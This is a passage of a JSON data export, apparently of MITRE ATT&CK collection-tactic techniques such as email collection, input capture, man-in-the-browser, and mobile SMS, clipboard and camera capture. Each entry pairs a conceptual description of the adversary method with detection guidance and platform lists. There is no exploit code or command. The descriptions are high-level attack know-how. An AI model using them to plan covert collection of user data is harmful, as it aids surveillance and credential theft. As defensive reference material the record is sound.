11:56:01"}},{"id":8,"name":"AWS","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":213,"platform_id":8,"created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01"}},{"id":9,"name":"SaaS","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":213,"platform_id":9,"created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01"}}]},{"id":214,"name":"T1005 - Data from Local System","sort_id":0,"external_id":"T1005","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":16,"description":"<p>Adversaries may search local system sources, such as file systems or local databases, to find files of interest and sensitive data prior to Exfiltration.<\/p>\n<p>Adversaries may do this using a <a href=\"https:\/\/attack.mitre.org\/techniques\/T1059\">Command and Scripting Interpreter<\/a>, such as <a href=\"https:\/\/attack.mitre.org\/software\/S0106\">cmd<\/a>, which has functionality to interact with the file system to gather information. Some adversaries may also use <a href=\"https:\/\/attack.mitre.org\/techniques\/T1119\">Automated Collection<\/a> on the local system.<\/p>","is_deprecated":false,"created_at":"2020-06-26 11:56:01","updated_at":"2020-07-28 16:02:19","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":"Monitor processes and command-line arguments for actions that could be taken to collect files from a system. Remote access tools with built-in features may interact directly with the Windows API to gather data. Data may also be acquired through Windows system management tools such as [Windows Management Instrumentation](https:\/\/attack.mitre.org\/techniques\/T1047) and [PowerShell](https:\/\/attack.mitre.org\/techniques\/T1059\/001).","platforms":[{"id":1,"name":"Linux","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":214,"platform_id":1,"created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01"}},{"id":2,"name":"macOS","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":214,"platform_id":2,"created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01"}},{"id":3,"name":"Windows","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":214,"platform_id":3,"created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01"}}]},{"id":215,"name":"T1039 - Data from Network Shared Drive","sort_id":0,"external_id":"T1039","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":16,"description":"<p>Adversaries may search network shares on computers they have compromised to find files of interest. Sensitive data can be collected from remote systems via shared network drives (host shared directory, network file server, etc.) that are accessible from the current system prior to Exfiltration. Interactive command shells may be in use, and common functionality within <a href=\"https:\/\/attack.mitre.org\/software\/S0106\">cmd<\/a> may be used to gather information.<\/p>","is_deprecated":false,"created_at":"2020-06-26 11:56:01","updated_at":"2020-07-28 16:02:19","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":"Monitor processes and command-line arguments for actions that could be taken to collect files from a network share. Remote access tools with built-in features may interact directly with the Windows API to gather data. Data may also be acquired through Windows system management tools such as [Windows Management Instrumentation](https:\/\/attack.mitre.org\/techniques\/T1047) and [PowerShell](https:\/\/attack.mitre.org\/techniques\/T1059\/001).","platforms":[{"id":1,"name":"Linux","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":215,"platform_id":1,"created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01"}},{"id":2,"name":"macOS","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":215,"platform_id":2,"created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01"}},{"id":3,"name":"Windows","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":215,"platform_id":3,"created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01"}}]},{"id":216,"name":"T1025 - Data from Removable Media","sort_id":0,"external_id":"T1025","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":16,"description":"<p>Adversaries may search connected removable media on computers they have compromised to find files of interest. Sensitive data can be collected from any removable media (optical disk drive, USB memory, etc.) connected to the compromised system prior to Exfiltration. Interactive command shells may be in use, and common functionality within <a href=\"https:\/\/attack.mitre.org\/software\/S0106\">cmd<\/a> may be used to gather information. <\/p>\n<p>Some adversaries may also use <a href=\"https:\/\/attack.mitre.org\/techniques\/T1119\">Automated Collection<\/a> on removable media.<\/p>","is_deprecated":false,"created_at":"2020-06-26 11:56:01","updated_at":"2020-07-28 16:02:19","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":"Monitor processes and command-line arguments for actions that could be taken to collect files from a system's connected removable media. Remote access tools with built-in features may interact directly with the Windows API to gather data. Data may also be acquired through Windows system management tools such as [Windows Management Instrumentation](https:\/\/attack.mitre.org\/techniques\/T1047) and [PowerShell](https:\/\/attack.mitre.org\/techniques\/T1059\/001).","platforms":[{"id":1,"name":"Linux","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":216,"platform_id":1,"created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01"}},{"id":2,"name":"macOS","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":216,"platform_id":2,"created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01"}},{"id":3,"name":"Windows","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":216,"platform_id":3,"created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01"}}]},{"id":229,"name":"T1114 - Email Collection","sort_id":0,"external_id":"T1114","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":16,"description":"<p>Adversaries may target user email to collect sensitive information. Emails may contain sensitive data, including trade secrets or personal information, that can prove valuable to adversaries. Adversaries can collect or forward email from mail servers or clients. <\/p>","is_deprecated":false,"created_at":"2020-06-26 11:56:01","updated_at":"2020-07-28 16:02:19","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":"There are likely a variety of ways an adversary could collect email from a target, each with a different mechanism for detection.\n\nFile access of local system email files for Exfiltration, unusual processes connecting to an email server within a network, or unusual access patterns or authentication attempts on a public-facing webmail server may all be indicators of malicious activity.\n\nMonitor processes and command-line arguments for actions that could be taken to gather local email files. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [Windows Management Instrumentation](https:\/\/attack.mitre.org\/techniques\/T1047) and [PowerShell](https:\/\/attack.mitre.org\/techniques\/T1059\/001).\n\nDetection is challenging because all messages forwarded because of an auto-forwarding rule have the same presentation as a manually forwarded message. It is also possible for the user to not be aware of the addition of such an auto-forwarding rule and not suspect that their account has been compromised; email-forwarding rules alone will not affect the normal usage patterns or operations of the email account.\n\nAuto-forwarded messages generally contain specific detectable artifacts that may be present in the header; such artifacts would be platform-specific. Examples include <code>X-MS-Exchange-Organization-AutoForwarded<\/code> set to true, <code>X-MailFwdBy<\/code> and <code>X-Forwarded-To<\/code>. The <code>forwardingSMTPAddress<\/code> parameter used in a forwarding process that is managed by administrators and not by user actions. All messages for the mailbox are forwarded to the specified SMTP address. However, unlike typical client-side rules, the message does not appear as forwarded in the mailbox; it appears as if it were sent directly to the specified destination mailbox.(Citation: Microsoft Tim McMichael Exchange Mail Forwarding 2) High volumes of emails that bear the <code>X-MS-Exchange-Organization-AutoForwarded<\/code> header (indicating auto-forwarding) without a corresponding number of emails that match the appearance of a forwarded message may indicate that further investigation is needed at the administrator level rather than user-level.","platforms":[{"id":3,"name":"Windows","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":229,"platform_id":3,"created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01"}},{"id":4,"name":"Office 365","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":229,"platform_id":4,"created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01"}}]},{"id":272,"name":"T1056 - Input Capture","sort_id":0,"external_id":"T1056","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":16,"description":"<p>Adversaries may use methods of capturing user input to obtain credentials or collect information. During normal system usage, users often provide credentials to various different locations, such as login pages\/portals or system dialog boxes. Input capture mechanisms may be transparent to the user (e.g. <a href=\"https:\/\/attack.mitre.org\/techniques\/T1056\/004\">Credential API Hooking<\/a>) or rely on deceiving the user into providing input into what they believe to be a genuine service (e.g. <a href=\"https:\/\/attack.mitre.org\/techniques\/T1056\/003\">Web Portal Capture<\/a>).<\/p>","is_deprecated":false,"created_at":"2020-06-26 11:56:01","updated_at":"2020-07-28 16:02:19","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":"Detection may vary depending on how input is captured but may include monitoring for certain Windows API calls (e.g. `SetWindowsHook`, `GetKeyState`, and `GetAsyncKeyState`)(Citation: Adventures of a Keystroke), monitoring for malicious instances of [Command and Scripting Interpreter](https:\/\/attack.mitre.org\/techniques\/T1059), and ensuring no unauthorized drivers or kernel modules that could indicate keylogging or API hooking are present.","platforms":[{"id":1,"name":"Linux","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":272,"platform_id":1,"created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01"}},{"id":2,"name":"macOS","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":272,"platform_id":2,"created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01"}},{"id":3,"name":"Windows","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":272,"platform_id":3,"created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01"}}]},{"id":290,"name":"T1185 - Man in the Browser","sort_id":0,"external_id":"T1185","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":16,"description":"<p>Adversaries can take advantage of security vulnerabilities and inherent functionality in browser software to change content, modify behavior, and intercept information as part of various man in the browser techniques. (Citation: Wikipedia Man in the Browser)<\/p>\n<p>A specific example is when an adversary injects software into a browser that allows an them to inherit cookies, HTTP sessions, and SSL client certificates of a user and use the browser as a way to pivot into an authenticated intranet. (Citation: Cobalt Strike Browser Pivot) (Citation: ICEBRG Chrome Extensions)<\/p>\n<p>Browser pivoting requires the SeDebugPrivilege and a high-integrity process to execute. Browser traffic is pivoted from the adversary's browser through the user's browser by setting up an HTTP proxy which will redirect any HTTP and HTTPS traffic. This does not alter the user's traffic in any way. The proxy connection is severed as soon as the browser is closed. Whichever browser process the proxy is injected into, the adversary assumes the security context of that process. Browsers typically create a new process for each tab that is opened and permissions and certificates are separated accordingly. With these permissions, an adversary could browse to any resource on an intranet that is accessible through the browser and which the browser has sufficient permissions, such as Sharepoint or webmail. Browser pivoting also eliminates the security provided by 2-factor authentication. (Citation: cobaltstrike manual)<\/p>","is_deprecated":false,"created_at":"2020-06-26 11:56:01","updated_at":"2020-07-28 16:02:20","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":"This is a difficult technique to detect because adversary traffic would be masked by normal user traffic. No new processes are created and no additional software touches disk. Authentication logs can be used to audit logins to specific web applications, but determining malicious logins versus benign logins may be difficult if activity matches typical user behavior. Monitor for process injection against browser applications","platforms":[{"id":3,"name":"Windows","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":290,"platform_id":3,"created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01"}}]},{"id":350,"name":"T1113 - Screen Capture","sort_id":0,"external_id":"T1113","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":16,"description":"<p>Adversaries may attempt to take screen captures of the desktop to gather information over the course of an operation. Screen capturing functionality may be included as a feature of a remote access tool used in post-compromise operations. Taking a screenshot is also typically possible through native utilities or API calls, such as <code>CopyFromScreen<\/code>, <code>xwd<\/code>, or <code>screencapture<\/code>.(Citation: CopyFromScreen .NET)(Citation: Antiquated Mac Malware)<\/p>","is_deprecated":false,"created_at":"2020-06-26 11:56:02","updated_at":"2020-07-28 16:02:20","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":"Monitoring for screen capture behavior will depend on the method used to obtain data from the operating system and write output files. Detection methods could include collecting information from unusual processes using API calls used to obtain image data, and monitoring for image files written to disk. The sensor data may need to be correlated with other events to identify malicious activity, depending on the legitimacy of this behavior within a given network environment.","platforms":[{"id":1,"name":"Linux","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":350,"platform_id":1,"created_at":"2020-06-26 11:56:02","updated_at":"2020-06-26 11:56:02"}},{"id":2,"name":"macOS","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":350,"platform_id":2,"created_at":"2020-06-26 11:56:02","updated_at":"2020-06-26 11:56:02"}},{"id":3,"name":"Windows","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":350,"platform_id":3,"created_at":"2020-06-26 11:56:02","updated_at":"2020-06-26 11:56:02"}}]},{"id":406,"name":"T1125 - Video Capture","sort_id":0,"external_id":"T1125","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":16,"description":"<p>An adversary can leverage a computer's peripheral devices (e.g., integrated cameras or webcams) or applications (e.g., video call services) to capture video recordings for the purpose of gathering information. Images may also be captured from devices or applications, potentially in specified intervals, in lieu of video files.<\/p>\n<p>Malware or scripts may be used to interact with the devices through an available API provided by the operating system or an application to capture video or images. Video or image files may be written to disk and exfiltrated later. This technique differs from <a href=\"https:\/\/attack.mitre.org\/techniques\/T1113\">Screen Capture<\/a> due to use of specific devices or applications for video recording rather than capturing the victim's screen.<\/p>\n<p>In macOS, there are a few different malware samples that record the user's webcam such as FruitFly and Proton. (Citation: objective-see 2017 review)<\/p>","is_deprecated":false,"created_at":"2020-06-26 11:56:02","updated_at":"2020-07-28 16:02:20","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":"Detection of this technique may be difficult due to the various APIs that may be used. Telemetry data regarding API use may not be useful depending on how a system is normally used, but may provide context to other potentially malicious activity occurring on a system.\n\nBehavior that could indicate technique use include an unknown or unusual process accessing APIs associated with devices or software that interact with the video camera, recording devices, or recording software, and a process periodically writing files to disk that contain video or camera image data.","platforms":[{"id":2,"name":"macOS","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":406,"platform_id":2,"created_at":"2020-06-26 11:56:02","updated_at":"2020-06-26 11:56:02"}},{"id":3,"name":"Windows","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":406,"platform_id":3,"created_at":"2020-06-26 11:56:02","updated_at":"2020-06-26 11:56:02"}}]},{"id":418,"name":"T1435 - Access Calendar Entries","sort_id":0,"external_id":"T1435","external_sub_id":null,"old_external_id":"MOB-T1038","old_external_sub_id":null,"tactic_id":16,"description":"<p>An adversary could call standard operating system APIs from a malicious application to gather calendar entry data, or with escalated privileges could directly access files containing calendar data.<\/p>","is_deprecated":false,"created_at":"2020-06-26 11:56:03","updated_at":"2020-07-28 16:02:21","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":"On both Android (6.0 and up) and iOS, the user can view which applications have permission to access calendar information through the device settings screen, and the user can choose to revoke the permissions.","platforms":[{"id":10,"name":"Android","created_at":"2020-06-26 11:56:02","updated_at":"2020-06-26 11:56:02","pivot":{"technique_id":418,"platform_id":10,"created_at":"2020-06-26 11:56:03","updated_at":"2020-06-26 11:56:03"}},{"id":11,"name":"iOS","created_at":"2020-06-26 11:56:02","updated_at":"2020-06-26 11:56:02","pivot":{"technique_id":418,"platform_id":11,"created_at":"2020-06-26 11:56:03","updated_at":"2020-06-26 11:56:03"}}]},{"id":419,"name":"T1433 - Access Call Log","sort_id":0,"external_id":"T1433","external_sub_id":null,"old_external_id":"MOB-T1036","old_external_sub_id":null,"tactic_id":16,"description":"<p>On Android, an adversary could call standard operating system APIs from a malicious application to gather call log data, or with escalated privileges could directly access files containing call log data.<\/p>\n<p>On iOS, applications do not have access to the call log, so privilege escalation would be required in order to access the data.<\/p>","is_deprecated":false,"created_at":"2020-06-26 11:56:03","updated_at":"2020-07-28 16:02:21","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":"On Android 6.0 and up, the user can view which applications have permission to access call log information through the device settings screen, and the user can choose to revoke the permissions.","platforms":[{"id":10,"name":"Android","created_at":"2020-06-26 11:56:02","updated_at":"2020-06-26 11:56:02","pivot":{"technique_id":419,"platform_id":10,"created_at":"2020-06-26 11:56:03","updated_at":"2020-06-26 11:56:03"}},{"id":11,"name":"iOS","created_at":"2020-06-26 11:56:02","updated_at":"2020-06-26 11:56:02","pivot":{"technique_id":419,"platform_id":11,"created_at":"2020-06-26 11:56:03","updated_at":"2020-06-26 11:56:03"}}]},{"id":420,"name":"T1432 - Access Contact List","sort_id":0,"external_id":"T1432","external_sub_id":null,"old_external_id":"MOB-T1035","old_external_sub_id":null,"tactic_id":16,"description":"<p>An adversary could call standard operating system APIs from a malicious application to gather contact list (i.e., address book) data, or with escalated privileges could directly access files containing contact list data.<\/p>","is_deprecated":false,"created_at":"2020-06-26 11:56:03","updated_at":"2020-07-28 16:02:21","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":"On both Android (6.0 and up) and iOS, the user can view which applications have permission to access contact list information through the device settings screen, and the user can choose to revoke the permissions.","platforms":[{"id":10,"name":"Android","created_at":"2020-06-26 11:56:02","updated_at":"2020-06-26 11:56:02","pivot":{"technique_id":420,"platform_id":10,"created_at":"2020-06-26 11:56:03","updated_at":"2020-06-26 11:56:03"}},{"id":11,"name":"iOS","created_at":"2020-06-26 11:56:02","updated_at":"2020-06-26 11:56:02","pivot":{"technique_id":420,"platform_id":11,"created_at":"2020-06-26 11:56:03","updated_at":"2020-06-26 11:56:03"}}]},{"id":421,"name":"T1517 - Access Notifications","sort_id":0,"external_id":"T1517","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":16,"description":"<p>A malicious application can read notifications sent by the operating system or other applications, which may contain sensitive data such as one-time authentication codes sent over SMS, email, or other mediums. A malicious application can also dismiss notifications to prevent the user from noticing that the notifications arrived and can trigger action buttons contained within notifications.(Citation: ESET 2FA Bypass)<\/p>","is_deprecated":false,"created_at":"2020-06-26 11:56:03","updated_at":"2020-07-28 16:02:21","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":"The user can inspect (and modify) the list of applications that have notification access through the device settings (e.g. Apps & notification -> Special app access -> Notification access).","platforms":[{"id":10,"name":"Android","created_at":"2020-06-26 11:56:02","updated_at":"2020-06-26 11:56:02","pivot":{"technique_id":421,"platform_id":10,"created_at":"2020-06-26 11:56:03","updated_at":"2020-06-26 11:56:03"}}]},{"id":422,"name":"T1413 - Access Sensitive Data in Device Logs","sort_id":0,"external_id":"T1413","external_sub_id":null,"old_external_id":"MOB-T1016","old_external_sub_id":null,"tactic_id":16,"description":"<p>On versions of Android prior to 4.1, an adversary may use a malicious application that holds the READ_LOGS permission to obtain private keys, passwords, other credentials, or other sensitive data stored in the device's system log. On Android 4.1 and later, an adversary would need to attempt to perform an operating system privilege escalation attack to be able to access the log.<\/p>","is_deprecated":false,"created_at":"2020-06-26 11:56:03","updated_at":"2020-06-26 11:56:03","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":null,"platforms":[{"id":10,"name":"Android","created_at":"2020-06-26 11:56:02","updated_at":"2020-06-26 11:56:02","pivot":{"technique_id":422,"platform_id":10,"created_at":"2020-06-26 11:56:03","updated_at":"2020-06-26 11:56:03"}}]},{"id":423,"name":"T1409 - Access Stored Application Data","sort_id":0,"external_id":"T1409","external_sub_id":null,"old_external_id":"MOB-T1012","old_external_sub_id":null,"tactic_id":16,"description":"<p>Adversaries may access and collect application data resident on the device. Adversaries often target popular applications such as Facebook, WeChat, and Gmail.(Citation: SWB Exodus March 2019)<\/p>\n<p>This technique requires either escalated privileges or for the targeted app to have stored the data in an insecure manner (e.g., with insecure file permissions or in an insecure location such as an external storage directory).<\/p>","is_deprecated":false,"created_at":"2020-06-26 11:56:03","updated_at":"2020-07-28 16:02:21","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":"Accessing stored application data can be difficult to detect, and therefore enterprises may be better served focusing on detection at other stages of adversarial behavior.","platforms":[{"id":10,"name":"Android","created_at":"2020-06-26 11:56:02","updated_at":"2020-06-26 11:56:02","pivot":{"technique_id":423,"platform_id":10,"created_at":"2020-06-26 11:56:03","updated_at":"2020-06-26 11:56:03"}},{"id":11,"name":"iOS","created_at":"2020-06-26 11:56:02","updated_at":"2020-06-26 11:56:02","pivot":{"technique_id":423,"platform_id":11,"created_at":"2020-06-26 11:56:03","updated_at":"2020-06-26 11:56:03"}}]},{"id":429,"name":"T1429 - Capture Audio","sort_id":0,"external_id":"T1429","external_sub_id":null,"old_external_id":"MOB-T1032","old_external_sub_id":null,"tactic_id":16,"description":"<p>Adversaries may capture audio to collect information on a user of a mobile device using standard operating system APIs. Adversaries may target audio information such as user conversations, surroundings, phone calls, or other sensitive information.<\/p>\n<p>Android and iOS, by default, requires that an application request access to microphone devices from the user. In Android, applications must hold the <code>android.permission.RECORD_AUDIO<\/code> permission to access the microphone and the <code>android.permission.CAPTURE_AUDIO_OUTPUT<\/code> permission to access audio output such as speakers. Android does not allow third-party applications to hold <code>android.permission.CAPTURE_AUDIO_OUTPUT<\/code>, so audio output can only be obtained by privileged applications (distributed by Google or the device vendor) or after a successful privilege escalation attack. In iOS, applications must include the <code>NSMicrophoneUsageDescription<\/code> key in their <code>Info.plist<\/code> file.<\/p>","is_deprecated":false,"created_at":"2020-06-26 11:56:03","updated_at":"2020-07-28 16:02:21","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":"On both Android (6.0 and up) and iOS, the user can view which applications have permission to use the microphone through the device settings screen, and the user can choose to revoke the permissions.","platforms":[{"id":10,"name":"Android","created_at":"2020-06-26 11:56:02","updated_at":"2020-06-26 11:56:02","pivot":{"technique_id":429,"platform_id":10,"created_at":"2020-06-26 11:56:03","updated_at":"2020-06-26 11:56:03"}},{"id":11,"name":"iOS","created_at":"2020-06-26 11:56:02","updated_at":"2020-06-26 11:56:02","pivot":{"technique_id":429,"platform_id":11,"created_at":"2020-06-26 11:56:03","updated_at":"2020-06-26 11:56:03"}}]},{"id":430,"name":"T1512 - Capture Camera","sort_id":0,"external_id":"T1512","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":16,"description":"<p>Adversaries may utilize the camera to capture information about the user, their surroundings, or other physical identifiers. Adversaries may use the physical camera devices on a mobile device to capture images or video. By default, in Android and iOS, an application must request permission to access a camera device which is granted by the user through a request prompt. In Android, applications must hold the <code>android.permission.CAMERA<\/code> permission to access the camera. In iOS, applications must include the <code>NSCameraUsageDescription<\/code> key in the <code>Info.plist<\/code> file, and must request access to the camera at runtime.<\/p>","is_deprecated":false,"created_at":"2020-06-26 11:56:03","updated_at":"2020-07-28 16:02:21","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":"On Android and iOS, the user can view which applications have permission to use the camera through the device settings screen, and the user can choose to revoke the permissions.","platforms":[{"id":10,"name":"Android","created_at":"2020-06-26 11:56:02","updated_at":"2020-06-26 11:56:02","pivot":{"technique_id":430,"platform_id":10,"created_at":"2020-06-26 11:56:03","updated_at":"2020-06-26 11:56:03"}},{"id":11,"name":"iOS","created_at":"2020-06-26 11:56:02","updated_at":"2020-06-26 11:56:02","pivot":{"technique_id":430,"platform_id":11,"created_at":"2020-06-26 11:56:03","updated_at":"2020-06-26 11:56:03"}}]},{"id":431,"name":"T1414 - Capture Clipboard Data","sort_id":0,"external_id":"T1414","external_sub_id":null,"old_external_id":"MOB-T1017","old_external_sub_id":null,"tactic_id":16,"description":"<p>Adversaries may abuse Clipboard Manager APIs to obtain sensitive information copied to the global clipboard. For example, passwords being copy-and-pasted from a password manager app could be captured by another application installed on the device.(Citation: Fahl-Clipboard)<\/p>\n<p>On Android, <code>ClipboardManager.OnPrimaryClipChangedListener<\/code> can be used by applications to register as a listener and monitor the clipboard for changes.(Citation: Github Capture Clipboard 2019)<\/p>\n<p>Android 10 mitigates this technique by preventing applications from accessing clipboard data unless the application is on the foreground or is set as the device\u2019s default input method editor (IME).(Citation: Android 10 Privacy Changes)<\/p>","is_deprecated":false,"created_at":"2020-06-26 11:56:03","updated_at":"2020-07-28 16:02:21","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":"Capturing clipboard content can be difficult to detect, and therefore enterprises may be better served focusing on detection at other stages of adversarial behavior.","platforms":[{"id":10,"name":"Android","created_at":"2020-06-26 11:56:02","updated_at":"2020-06-26 11:56:02","pivot":{"technique_id":431,"platform_id":10,"created_at":"2020-06-26 11:56:03","updated_at":"2020-06-26 11:56:03"}},{"id":11,"name":"iOS","created_at":"2020-06-26 11:56:02","updated_at":"2020-06-26 11:56:02","pivot":{"technique_id":431,"platform_id":11,"created_at":"2020-06-26 11:56:03","updated_at":"2020-06-26 11:56:03"}}]},{"id":432,"name":"T1412 - Capture SMS Messages","sort_id":0,"external_id":"T1412","external_sub_id":null,"old_external_id":"MOB-T1015","old_external_sub_id":null,"tactic_id":16,"description":"<p>A malicious application could capture sensitive data sent via SMS, including authentication credentials. SMS is frequently used to transmit codes used for multi-factor authentication.<\/p>\n<p>On Android, a malicious application must request and obtain permission (either at app install time or run time) in order to receive SMS messages. Alternatively, a malicious application could attempt to perform an operating system privilege escalation attack to bypass the permission requirement.<\/p>\n<p>On iOS, applications cannot access SMS messages in normal operation, so an adversary would need to attempt to perform an operating system privilege escalation attack to potentially be able to access SMS messages.<\/p>","is_deprecated":false,"created_at":"2020-06-26 11:56:03","updated_at":"2020-07-28 16:02:21","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":"On Android, the user can view which applications have permission to access SMS messages through the device settings, and the user can choose to revoke the permission.","platforms":[{"id":10,"name":"Android","created_at":"2020-06-26 11:56:02","updated_at":"2020-06-26 11:56:02","pivot":{"technique_id":432,"platform_id":10,"created_at":"2020-06-26 11:56:03","updated_at":"2020-06-26 11:56:03"}},{"id":11,"name":"iOS","created_at":"2020-06-26 11:56:02","updated_at":"2020-06-26 11:56:02","pivot":{"technique_id":432,"platform_id":11,"created_at":"2020-06-26 11:56:03","updated_at":"2020-06-26 11:56:03"}}]},{"id":437,"name":"T1533 - Data from Local System","sort_id":0,"external_id":"T1533","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":16,"description":"<p>Sensitive data can be collected from local system sources, such as the file system or databases of information residing on the system.<\/p>\n<p>Local system data includes information stored by the operating system. Access to local system data often requires escalated privileges (e.g. root access). Examples of local system data include authentication tokens, the device keyboard cache, Wi-Fi passwords, and photos.<\/p>","is_deprecated":false,"created_at":"2020-06-26 11:56:03","updated_at":"2020-07-28 16:02:21","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":"Accessing data from the local system can be difficult to detect, and therefore enterprises may be better served focusing on detection at other stages of adversarial behavior.","platforms":[{"id":10,"name":"Android","created_at":"2020-06-26 11:56:02","updated_at":"2020-06-26 11:56:02","pivot":{"technique_id":437,"platform_id":10,"created_at":"2020-06-26 11:56:03","updated_at":"2020-06-26 11:56:03"}},{"id":11,"name":"iOS","created_at":"2020-06-26 11:56:02","updated_at":"2020-06-26 11:56:02","pivot":{"technique_id":437,"platform_id":11,"created_at":"2020-06-26 11:56:03","updated_at":"2020-06-26 11:56:03"}}]},{"id":458,"name":"T1417 - Input Capture","sort_id":0,"external_id":"T1417","external_sub_id":null,"old_external_id":"MOB-T1020","old_external_sub_id":null,"tactic_id":16,"description":"<p>Adversaries may capture user input to obtain credentials or other information from the user through various methods.<\/p>\n<p>Malware may masquerade as a legitimate third-party keyboard to record user keystrokes.(Citation: Zeltser-Keyboard) On both Android and iOS, users must explicitly authorize the use of third-party keyboard apps. Users should be advised to use extreme caution before granting this authorization when it is requested.<\/p>\n<p>On Android, malware may abuse accessibility features to record keystrokes by registering an 